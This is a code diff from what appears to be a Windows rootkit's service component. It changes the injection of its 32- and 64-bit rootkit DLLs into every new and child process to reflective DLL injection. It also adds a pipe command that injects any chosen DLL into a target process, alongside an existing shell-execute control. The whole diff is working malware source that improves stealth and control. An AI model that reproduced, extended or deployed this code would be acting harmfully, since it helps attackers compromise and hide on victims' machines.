@@ -99,12 +99,14 @@ VOID UninitializeService()
 	if (ChildProcessListenerThread)
 	{
 		TerminateThread(ChildProcessListenerThread, 0);
+		CloseHandle(ChildProcessListenerThread);
 		ChildProcessListenerThread = NULL;
 	}
 
 	if (NewProcessListenerThread)
 	{
 		TerminateThread(NewProcessListenerThread, 0);
+		CloseHandle(NewProcessListenerThread);
 		NewProcessListenerThread = NULL;
 	}
 
@@ -117,6 +119,7 @@ VOID UninitializeService()
 		// thus, this function will cease to execute.
 
 		TerminateThread(ControlPipeListenerThread, 0);
+		CloseHandle(ControlPipeListenerThread);
 		ControlPipeListenerThread = NULL;
 	}
 }
@@ -133,8 +136,8 @@ VOID ChildProcessCallback(DWORD processId)
 
 	if (!IsInjectionPaused)
 	{
-		InjectDll(processId, RootkitDll32, RootkitDll32Size);
-		InjectDll(processId, RootkitDll64, RootkitDll64Size);
+		InjectDllReflective(processId, RootkitDll32, RootkitDll32Size, 100);
+		InjectDllReflective(processId, RootkitDll64, RootkitDll64Size, 100);
 	}
 }
 VOID NewProcessCallback(DWORD processId)
@@ -143,8 +146,8 @@ VOID NewProcessCallback(DWORD processId)
 
 	if (!IsInjectionPaused)
 	{
-		InjectDll(processId, RootkitDll32, RootkitDll32Size);
-		InjectDll(processId, RootkitDll64, RootkitDll64Size);
+		InjectDllReflective(processId, RootkitDll32, RootkitDll32Size, 0);
+		InjectDllReflective(processId, RootkitDll64, RootkitDll64Size, 0);
 	}
 }
 VOID ControlCallback(DWORD controlCode, HANDLE pipe)
@@ -190,8 +193,8 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 			DWORD bytesRead;
 			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
 			{
-				InjectDll(processId, RootkitDll32, RootkitDll32Size);
-				InjectDll(processId, RootkitDll64, RootkitDll64Size);
+				InjectDllReflective(processId, RootkitDll32, RootkitDll32Size, 0);
+				InjectDllReflective(processId, RootkitDll64, RootkitDll64Size, 0);
 			}
 
 			break;
@@ -262,6 +265,21 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 
 				FREE(processes);
 			}
+			break;
+		}
+		case CONTROL_PROCESSES_LOAD_LIBRARY:
+		{
+			DWORD processId;
+			DWORD bytesRead;
+			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
+			{
+				WCHAR dllPath[MAX_PATH + 1];
+				if (ReadFileStringW(pipe, dllPath, MAX_PATH + 1))
+				{
+					InjectDll(processId, dllPath);
+				}
+			}
+
 			break;
 		}
 		case CONTROL_USER_SHELLEXEC:
